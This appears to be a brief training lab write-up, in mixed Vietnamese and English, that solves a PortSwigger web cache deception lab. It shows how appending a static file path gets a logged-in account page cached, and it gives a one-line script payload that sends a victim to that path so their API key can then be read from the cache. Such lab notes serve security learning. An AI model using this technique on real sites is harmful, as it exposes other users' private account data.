# WEB CACHE DECEPTION

## Exploiting static extension cache rules

### Exploiting path mapping discrepancies
#### 1. Lab: Exploiting path mapping for web cache deception
**Yêu cầu**
To solve the lab, find the API key for the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`.

>Required Knowlegde
To solve this lab, you'll need to know:
- How regex endpoints map URL paths to resources.
- How to detect and exploit discrepancies in the way the cache and origin server map URL paths.

**Thực hiện**
dang nhap 
![alt text](image.png)

thu thay doi
![alt text](image-1.png)

them tệp tĩnh để kích hoạt cơ chế lưu cache
![alt text](image-2.png)
thu truy cap lai
![alt text](image-3.png)
```Cache-Control: max-age=30
Age: 13
X-Cache: hit```
=> Phát hiện được cơ chế lưu cache

craft an exploit
`<script>document.location="https://id.web-security-academy.net/my-account/tmp.js"</script>`

store lại và gửi đến nạn nhân.
Kiểm tra nạn nhân nhận được chưa ?
Thực hiện truy vấn tới cache trên burp `GET /my-account/tmp.js`

